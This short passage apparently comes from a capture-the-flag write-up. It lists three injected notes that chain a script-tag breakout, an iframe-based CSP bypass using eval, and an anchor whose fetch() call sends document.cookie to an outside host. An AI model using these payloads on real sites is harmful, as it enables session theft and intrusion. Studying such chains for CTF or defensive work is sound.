* Insert a note that contains `</script>` to break out of that script tag so that we can inject subsequent payloads.

* Insert a note that contains `<iframe src=/profile name=a></iframe>` and modify `shared_user_name` to `";a.eval(""+m)//`. Bypassing the CSP by executing on the `/profile` page. Here, `m` is the payload to be executed.

* Insert a note that contains `<a id="m" href=abc:fetch("//"+document.cookie.substr(13).replaceAll("_",".").replace("}","")+"ip");></a>`.
